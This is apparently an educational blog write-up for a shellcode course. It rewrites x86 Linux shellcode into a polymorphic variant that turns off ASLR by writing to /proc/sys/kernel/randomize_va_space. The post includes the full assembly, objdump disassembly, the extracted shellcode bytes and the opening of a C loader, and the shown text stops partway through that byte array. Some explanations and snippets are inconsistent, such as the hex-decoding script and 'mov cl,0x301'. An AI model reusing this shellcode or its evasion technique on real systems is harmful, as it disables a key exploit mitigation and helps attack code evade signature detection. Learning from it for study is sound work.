<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
int creat(const char *pathname, mode_t mode);
</pre>

<p style="text-align:justify;">The <strong>creat()</strong> system call returns an integer. There are also two arguments passed to the function, the first is the <strong>pathname</strong> of type<em> char*</em> and the second one is the <strong>mode</strong> of type <em>mode</it>t</em>. Additionally, according to <strong>creat()</strong> general description, the <strong>creat()</strong> system call is equivalent with the following call :</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
open(path, O_WRONLY|O_CREAT|O_TRUNC, mode)
</pre>

<p style="text-align:justify;">Thus the file named by <span class="ph synph"><span class="ph var">pathname</span></span> is created, unless it already exists. Furthermore, the next instructions will push the following path <strong>/proc/sys/kernel/randomize_va_space</strong> into the stack in order to pass the first argument of the <strong>creat()</strong> system call.</p>
<p>The next instruction will push the <strong>eax</strong> register into the stack</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">push eax </pre>
<p>The above instruction will be changed as follows</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#00ff00;"><span style="color:#00ffff;">;Altered Instructions</span> <br />mov dword [esp-4], eax</span><br /><span style="color:#00ff00;">sub esp, 4</span></pre>
<p style="text-align:justify;">These two instructions are performing the same operation as the <strong>push eax</strong> instruction does. In more detail, <strong>eax</strong> stored in memory using stack pointer minus 4 <strong>[esp-4]</strong> which refers to the <strong>esp </strong>offset regarding the type of the variable kept by <strong>eax</strong> register which is <strong>DWORD</strong> and stands for 32-bit unsigned integer holding 4 bytes in memory. Also, in order to reserve the available space in stack the <strong>sub esp, 4 </strong>instruction has been used, which makes room for one 4 byte local variable. Also, in order to achieve a minimal length of the polymorphic version, the above instructions will be modified and merged with the following instructions that used to pass the path <strong>/proc/sys/kernel/randomize_va_space </strong> as the first argument of <strong>creat() </strong>system call.</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">push dword 0x65636170<br />push dword 0x735f6176<br />push dword 0x5f657a69<br />push dword 0x6d6f646e<br />push dword 0x61722f6c<br />push dword 0x656e7265<br />push dword 0x6b2f7379<br />push dword 0x732f636f<br />push dword 0x72702f2f</pre>
<p style="text-align:justify;">Additionally, the following python script will be used as shown below in order to convert the hex values into ASCII chars</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">#!/bin/python<br /><br />print "6d6f646e".decode("hex") \<br />+ "735f6176".decode("hex") + \<br />"5f657a69".decode("hex") + \<br />"6d6f646e".decode("hex") + \<br />"61722f6c".decode("hex") + \<br />"656e7265".decode("hex") + \<br />"6b2f7379".decode("hex") + \<br />"732f636f".decode("hex") + \<br />"72702f2f".decode("hex")</pre>
<p>After running the script above, the path <strong>//proc/sys/kernel/randomize_va_space </strong>will be inserted into the stack in reverse order as seen below</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">root@slae:/home/xenofon/Documents/Assignment6# python hex.py<br />modns_av_ezimodnar/lenrek/sys/corp//</pre>
<p style="text-align:justify;">Also, be noted that there is an extra slash at the beginning of the path. The extra slash is needed to align the value to a multiple of 4 bytes in order to transform the string into the exact hexadecimal size and then push it into the stack.  Also, the number of slashes in a Linux command line do not matter.</p>
<p style="text-align:justify;">Afterwards, further analysis will take place at the following instructions regarding the second argument of the <strong>creat()</strong> system call, but before moving further, the <strong>mov ebx, esp </strong>instruction will be used to perform stack alignment at the top of the stack. To continue further, the second argument will be used to pass the mode of the file which is <strong>0x2bc</strong> in hex, and <strong>700</strong> in decimal, meaning that the owner will have permissions to read, write and execute that file. Then, <strong>mov al, 0x8</strong> instruction will be used to assign the immediate value <strong>0x8 </strong> to the lower byte register <strong>al</strong>. The value <strong>0x8</strong> indicates the <strong>creat()</strong> system call as shown at the image below.</p>
<p style="text-align:justify;"><img class="alignnone size-full wp-image-944" src="{{ site.baseurl }}/assets/images/2019/06/capture.png" alt="Capture" width="1059" height="253" /></p>
<p style="text-align:justify;">Then, the <strong>int 0x80</strong> instruction will be used to call the <strong>creat()</strong> system call. So basically, the <strong>creat()</strong> function will be constructed as follows</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">int fd = creat("//proc/sys/kernel/randomize_va_space", 0x2bc);</pre>
<p style="text-align:justify;">To summarise, the following analysed instructions are representing the implementation of the <strong>creat()</strong> system call.</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">xor eax,eax<br />push eax<br />push dword 0x65636170<br />push dword 0x735f6176<br />push dword 0x5f657a69<br />push dword 0x6d6f646e<br />push dword 0x61722f6c<br />push dword 0x656e7265<br />push dword 0x6b2f7379<br />push dword 0x732f636f<br />push dword 0x72702f2f<br />mov ebx,esp<br />mov cx,0x2bc<br />mov al,0x8<br />int 0x80</pre>
<p style="text-align:justify;">Now, the above instructions will be changed, but the functionality will remain intact, performing only polymorphic changes to the code. So, the instructions will be changed into the following as seen in green</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#00ffff;">; Altered instructions</span> <br /><span style="color:#00ff00;">xor ebx,ebx</span><br /><span style="color:#00ff00;">mul ebx</span><br /><span style="color:#00ff00;">mov DWORD [esp-0x4],eax</span><br /><span style="color:#00ff00;">mov DWORD [esp-0x8],0x65636170</span><br /><span style="color:#00ff00;">mov DWORD [esp-0xc],0x735f6176</span><br /><span style="color:#00ff00;">mov DWORD [esp-0x10],0x5f657a69</span><br /><span style="color:#99cc00;"><span style="color:#00ff00;">mov DWORD [esp-0x14],0x6d6f646e</span></span><br /><span style="color:#00ff00;">mov DWORD [esp-0x18],0x61722f6c</span><br /><span style="color:#00ff00;">mov DWORD [esp-0x1c],0x656e7265</span><br /><span style="color:#00ff00;">mov DWORD [esp-0x20],0x6b2f7379</span><br /><span style="color:#00ff00;">mov DWORD [esp-0x24],0x732f636f</span><br /><span style="color:#00ff00;">mov DWORD [esp-0x28],0x72702f2f</span><br /><span style="color:#00ff00;">sub esp,0x28</span><br /><span style="color:#00ff00;">mov ebx,esp</span><br /><br /><span style="color:#00ff00;">mov cl,0x4e</span><br /><span style="color:#00ff00;">add cl,0x16</span><br /><span style="color:#00ff00;">mov dx,0x2bc</span><br /><br /><span style="color:#00ff00;">push 0x5</span><br /><span style="color:#00ff00;">pop eax</span><br />int 0x80</pre>
<p style="text-align:justify;">The instructions above providing a way of changing the original instructions in order to achieve polymorphism. As seen above, the two instructions <strong>xor ebx, ebx</strong> and <strong>mul ebx</strong> used instead of <strong>xor eax, eax</strong> in order to zero out the <strong>eax </strong>register. The <strong>mul</strong> instruction used to perform multiplication where <strong>ebx</strong> register is acting as the multiplier and the <strong>eax</strong> register as the multiplicand. So, in the case where the multiplier which is the <strong>ebx</strong> register is already assigned with zero, the multiplication with <strong>eax </strong>register will also assign the <strong>eax</strong> and <strong>edx </strong>registers with zero, and that because the final product of the multiplication is stored in <strong>edx:eax</strong> registers. Following further, the sequence of the <strong>mov </strong>instructions will substitute the sequence of <strong>push</strong> instructions seen at the original <em>shellcode</em>,  as shown below</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#00ff00;"><span style="color:#00ffff;">;Altered Instructions</span><br />mov DWORD [esp-0x4],eax</span><br /><span style="color:#00ff00;">mov DWORD [esp-0x8],0x65636170</span><br /><span style="color:#00ff00;">mov DWORD [esp-0xc],0x735f6176</span><br /><span style="color:#00ff00;">mov DWORD [esp-0x10],0x5f657a69</span><br /><span style="color:#00ff00;">mov DWORD [esp-0x14],0x6d6f646e</span><br /><span style="color:#00ff00;">mov DWORD [esp-0x18],0x61722f6c</span><br /><span style="color:#00ff00;">mov DWORD [esp-0x1c],0x656e7265</span><br /><span style="color:#00ff00;">mov DWORD [esp-0x20],0x6b2f7379</span><br /><span style="color:#00ff00;">mov DWORD [esp-0x24],0x732f636f</span><br /><span style="color:#00ff00;">mov DWORD [esp-0x28],0x72702f2f</span><br /><span style="color:#99cc00;"><span style="color:#00ff00;">sub esp,0x28</span> <span style="color:#00ffff;">// make room for the values in stack </span></span><br /><span style="color:#00ff00;">mov ebx,esp</span></pre>
<p style="text-align:justify;">The <strong>mov </strong>instructions above are doing the same thing as the <strong>push</strong> instructions seen before at the original <em>shellcode</em>, because the two instructions are decrementing the stack pointer by the operand size, then move the operand to the location pointed by the stack pointer. Furthermore, the <strong>sub esp, 0x28</strong> instruction used to make room for ten local variables in stack and the <strong>mov ebx, esp</strong> instruction used to set the pointer at the top of the stack.</p>
<p style="text-align:justify;">Furthermore, the second argument of the <strong>creat()</strong> system call used to set the mode of the file. There, the writer of the original <em>shellcode</em> assigned the hex value <strong>0x2bc</strong> which is <strong>700</strong> in decimal at the <strong>dx</strong> register, meaning that the owner of the file can read, write and execute the file. Towards to that, changes at the assembly code will be done in order to achieve polymorphism.</p>
<p style="text-align:justify;">According with the man page of <strong><a href="https://linux.die.net/man/3/creat">creat(3)</a></strong> system call the following <strong><a href="https://linux.die.net/man/3/open">open(3)</a></strong> system call</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">open(path, O_WRONLY|O_CREAT|O_TRUNC, mode)</pre>
<p>is equivalent to the following <strong>creat()</strong> function call</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><
creat(path, mode)
</pre>

<p style="text-align:justify;">Following, in order to create polymorphism, the instructions implementing the <strong>open()</strong> system call will be changed using the additional instructions for the second and third argument of the <strong>open()</strong> system call. To proceed further, the hex values of <strong>O_CREAT | O_WRONLY | O_TRUNC</strong> flags must be known in order to use them as the second argument at <strong>open()</strong> system call. To this end, checking inside the /<em>usr/src/linux-headers-3.13.0-32/arch/mips/include/uapi/asm/fcntl.h</em> file the hex values of the flags above are seen below</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">#define O_CREAT  0x0100<br />#define O_TRUNC  0x0200</pre>
<p style="text-align:justify;">The <strong>O_WRONLY</strong> flag defined at <em>/usr/src/linux-headers-3.13.0-32/include/uapi/asm-generic/fcntl.h </em>having the binary value <strong>00000001</strong><em>. </em>Also, the same flag can be found <em>at /usr/include/i386-linux-gnu/bits/fcntl-linux.h </em>with binary value <strong>01</strong><em><strong>. </strong></em>Both values are representing the same hexadecimal result <strong>0x1</strong><em><strong>. </strong></em>So, in order to perform the bitwise OR operation shown below some zeros will be added from right to left, changing the value format into the equivalent <strong>0x0001</strong>. The bitwise OR is applying a logical OR to the specified values. The flags are defined as a bitmask or individual bits, and by using the OR operation specific bits can be set in the target.</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">0000 0000 0000 0001 O_WRONLY  ~ <span style="color:#ff0000;">0 0 0 1</span><br />0000 0001 0000 0000 O_CREAT   ~ <span style="color:#ff0000;">0 1 0 0</span><br />0000 0010 0000 0000 O_TRUNC   ~ <span style="color:#ff0000;">0 2 0 0</span><br /><strong>---------------------------
  
0000 0011 0000 0001 = 0x0301

</strong></pre>

<p style="text-align:justify;">
So, the compiler passes <b>0x0301</b> to the <b>open()</b> system call. As a result, the following instruction is provided&nbsp;
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
mov cl,0x301
</pre>

<p style="text-align:justify;">
which indicates the second argument of the <b>open()</b> system call. Also the <b>mov dx, 0x2bc</b> will be changed by adding <b>0x2a1</b> into <b>0x1b</b> as follows
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
;Original Instructions
mov dx, 0x2bc

;Altered instructions
mov dx,0x2a1
add dx,0x1b
</pre>

Continuously, the following instructions will be changed

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
mov al,0x8
int 0x80
</pre>

with the instructions below

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
; Altered instructions   
push 0x5
pop eax
int 0x80
</pre>

<p style="text-align:justify;">
The above instructions will push the immediate value <b>0x5</b> into the stack, indicating the <b>open()</b> system call. Then the <b>pop eax</b> instruction will store the immediate <b>0x5</b> into the <b>eax</b> register and then the <b>int 0x80</b> instruction will call the function.

Next, polymorphism will be created for the instructions below implementing the <b>write()</b> system call. From the original assembly code the following instructions can be seen
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
mov ebx,eax
push eax
mov dx,0x3a30
push dx
mov ecx,esp
xor edx,edx
inc edx
mov al,0x4
int 0x80
</pre>

The above instructions altered with the following instructions in order to achieve polymorphism

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
mov ebx,eax
;Altered Instructions
push ebx
mov cx,0x3b30
push cx
mov ecx,esp
;Altered Instructions
shr edx, 16
inc edx
mov al, 0x4
</pre>

the above instructions are representing the following system call

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
sys_write(fd,"0;",1);
</pre>


<p style="text-align:justify;">
The <b>mov ebx, eax</b> instruction assigns the value of file descriptor existing in <b>eax</b> register into the <b>ebx</b> register. Also, checking at the [Linux Syscall Reference](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit), the <b>ebx</b> register consists the first argument of the <b>write()</b> system call. Afterwards, the instruction <b>push ebx</b> pushes the file descriptor into the stack. The second argument of the <b>write()</b>system call referenced by the <b>ecx</b> register consists the buffer that contains the value to write inside the file. Also, the third argument referenced by the <b>edx</b> register consists the size of the buffer where in this case is one(1) byte. The instruction <b>mov cx, 0x3b30</b> represents the second argument meaning that the value <b>0;</b> will be inserted into the <b>cx</b> register containing the size of the buffer. Furthermore, the <b>0x3a30</b> hex original value altered into <b>0x3b30</b> changing " <b>:</b>" to " <b>;</b>" which does not negatively affect the execution of the program as it is not interpreted in the execution. Also, the 16bit <b>cx</b> &nbsp;register has been chosen instead of <b>ecx</b> in order to avoid producing any null bytes. As seen at the instructions above, the buffer that contains the <b>0</b> value indicating the non randomisation action of the system memory. Additionally, the <b>';'</b> value is irrelevant because the size of the buffer is only one(1) byte long, thus the <b>0</b> value will only be taken as valid. After moving the chars <b>"0;"</b> inside the second argument of the <b>write()</b> function, the instruction <b>mov ecx, esp</b> will be provided in order to align the stack pointer at the beginning of the stack. As mentioned before, the final argument contains the value of the size of the buffer which must be <b>1</b> , so the altered instructions to achieve this change, first must zero out the lower 16bits from <b>edx</b> register. To achieve this, the instruction <b>shr edx,16</b> will be used which shifts the <b>edx</b> lower 16bits by sixteen positions to the right, thus zeroing out the <b>edx</b> register. Then, the <b>edx</b> register will be increased by one in order to provide the size of the buffer to the <b>write()</b> system call. Following, a common way to call the <b>write()&nbsp;</b> system call is by using <b>mov al, 0x4</b> instruction which assigns the <b>0x4</b> immediate value to the <b>al</b> lower byte register. Then the instruction <b>int 0x80</b> is called to execute the <b>write()&nbsp; system call.
</p>


<p style="text-align:justify;">
According with the <a href="http://man7.org/linux/man-pages/man2/write.2.html">write(2)</a> man page, in order to successfully return from the <b>write()</b> system call, it is certainly a good programming practice to use the <b>fsync()</b> and <b>close()</b> functions. Another good programming practice is to use the <a href="https://linux.die.net/man/2/waitpid">waitpid(2)</a> system call in order to force the system to wait for the child process to finish and then release the resources associated with the child before exiting the execution. In this case the <it>shellcode</it> writer uses the <b>close()&nbsp;</b> system call followed by the <b>waitpid()</b> system call <b>.</b> According with the <a href="http://man7.org/linux/man-pages/man2/close.2.html">close(2)</a> man page, the <b>close()</b> system call closes a file descriptor, so that it no longer refers to any file and may be reused. Furthermore, because the <b>close()</b> system call does not provide any guarantee that the data has been successfully saved to disk, the <a href="http://man7.org/linux/man-pages/man2/fsync.2.html">sync(2)</a> system call could be used along with <b>close()</b>. In case of using <a href="http://man7.org/linux/man-pages/man3/exit.3.html">exit(3)</a> system call all open streams are flushed and closed. Also the parent process might be notified of the exit status and the child dies immediately. According with the above, <b>fsync()</b>, <b>close()</b>, and <b>waitpid()</b> are providing guarantee that all open files will be closed as well as all the processes wil be terminated after done their work. As mentioned above, the functionality offered by the <b>exit()</b> system call shouold be enough, so it could be avoided in order to produce a shorter shellcode.
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
mov al,0x6
int 0x80
inc eax
int 0x80
</pre>

<p style="text-align:justify;">
Then the <b>waitpid()</b> and <b>close()</b> functions will be changed with the <b>exit()</b> system call as shown below
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
; Altered instructions  
mov al,0x1
int 0x80
</pre>

The final polymorphic version of the original <it>shellcode</it> is shown below

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
global _start

section .text

_start:
 xor ebx,ebx
 mul ebx
 mov DWORD [esp-0x4],eax
 mov DWORD [esp-0x8],0x65636170
 mov DWORD [esp-0xc],0x735f6176
 mov DWORD [esp-0x10],0x5f657a69
 mov DWORD [esp-0x14],0x6d6f646e
 mov DWORD [esp-0x18],0x61722f6c
 mov DWORD [esp-0x1c],0x656e7265
 mov DWORD [esp-0x20],0x6b2f7379
 mov DWORD [esp-0x24],0x732f636f
 mov DWORD [esp-0x28],0x72702f2f
 sub esp,0x28
 mov ebx,esp
 mov cx,0x301
 mov dx,0x2a1
 add dx,0x1b
 mov al, 0x5
 int 0x80
 mov ebx,eax
 push ebx
 mov cx,0x3b30
 push cx
 mov ecx,esp
 shr edx, 16
 inc edx
 mov al,0x4
 int 0x80
 mov al,0x1
 int 0x80
</pre>


<p style="text-align:justify;">
Now that the writing of the polymorphic <it>shellcode</it> version finished, a test will run in order to check if it works. Following, checking about null bytes using <b>objdump</b> as shown below
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>/home/xenofon/Documents/Assignment6</b></span># objdump -d polyaslr -M intel

polyaslr: file format elf32-i386

Disassembly of section .text:

 08048080 < _start >:
 8048080: 31 db xor ebx,ebx
 8048082: f7 e3 mul ebx
 8048084: 89 44 24 fc mov DWORD PTR [esp-0x4],eax
 8048088: c7 44 24 f8 70 61 63 mov DWORD PTR [esp-0x8],0x65636170
 804808f: 65 
 8048090: c7 44 24 f4 76 61 5f mov DWORD PTR [esp-0xc],0x735f6176
 8048097: 73 
 8048098: c7 44 24 f0 69 7a 65 mov DWORD PTR [esp-0x10],0x5f657a69
 804809f: 5f 
 80480a0: c7 44 24 ec 6e 64 6f mov DWORD PTR [esp-0x14],0x6d6f646e
 80480a7: 6d 
 80480a8: c7 44 24 e8 6c 2f 72 mov DWORD PTR [esp-0x18],0x61722f6c
 80480af: 61 
 80480b0: c7 44 24 e4 65 72 6e mov DWORD PTR [esp-0x1c],0x656e7265
 80480b7: 65 
 80480b8: c7 44 24 e0 79 73 2f mov DWORD PTR [esp-0x20],0x6b2f7379
 80480bf: 6b 
 80480c0: c7 44 24 dc 6f 63 2f mov DWORD PTR [esp-0x24],0x732f636f
 80480c7: 73 
 80480c8: c7 44 24 d8 2f 2f 70 mov DWORD PTR [esp-0x28],0x72702f2f
 80480cf: 72 
 80480d0: 83 ec 28 sub esp,0x28
 80480d3: 89 e3 mov ebx,esp
 80480d5: 66 b9 01 03 mov cx,0x301
 80480d9: 66 ba a1 02 mov dx,0x2a1
 80480dd: 66 83 c2 1b add dx,0x1b
 80480e1: b0 05 mov al,0x5
 80480e3: cd 80 int 0x80
 80480e5: 89 c3 mov ebx,eax
 80480e7: 53 push ebx
 80480e8: 66 b9 30 3b mov cx,0x3b30
 80480ec: 66 51 push cx
 80480ee: 89 e1 mov ecx,esp
 80480f0: c1 ea 10 shr edx,0x10
 80480f3: 42 inc edx
 80480f4: b0 04 mov al,0x4
 80480f6: cd 80 int 0x80
 80480f8: b0 01 mov al,0x1
 80480fa: cd 80 int 0x80

</pre>

<p style="text-align:justify;">
From the output above it seems that there are no null bytes around, so using <b>objdump</b> the production of the <it>shellcode</it> can be done as follows
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>/home/xenofon/Documents/Assignment6</b></span># objdump -d ./polyaslr|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xdb\xf7\xe3\x89\x44\x24\xfc\xc7\x44\x24\xf8\x70\x61\x63\x65\xc7\x44\x24\xf4\x76\x61\x5f\x73\xc7\x44\x24\xf0\x69\x7a\x65\x5f\xc7\x44\x24\xec\x6e\x64\x6f\x6d\xc7\x44\x24\xe8\x6c\x2f\x72\x61\xc7\x44\x24\xe4\x65\x72\x6e\x65\xc7\x44\x24\xe0\x79\x73\x2f\x6b\xc7\x44\x24\xdc\x6f\x63\x2f\x73\xc7\x44\x24\xd8\x2f\x2f\x70\x72\x83\xec\x28\x89\xe3\x66\xb9\x01\x03\x66\xba\xa1\x02\x66\x83\xc2\x1b\xb0\x05\xcd\x80\x89\xc3\x53\x66\xb9\x30\x3b\x66\x51\x89\xe1\xc1\xea\x10\x42\xb0\x04\xcd\x80\xb0\x01\xcd\x80"
</pre>

<p style="text-align:justify;">
Afterwards the produced <it>shellcode</it> will be added into a C program named <b>sh.c</b> in order to deliver the execution of the polimorphic shellcode.
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
#include &lt;stdio.h>
#include &lt;string.h> 

unsigned char code[] = \
 "\x31\xdb\xf7\xe3\x89\x44\x24\xfc\xc7"
 "\x44\x24\xf8\x70\x61\x63\x65\xc7\x44"
 "\x24\xf4\x76\x61\x5f\x73\xc7\x44\x24"
 "\xf0\x69\x7a\x65\x5f\xc7\x44\x24\xec"
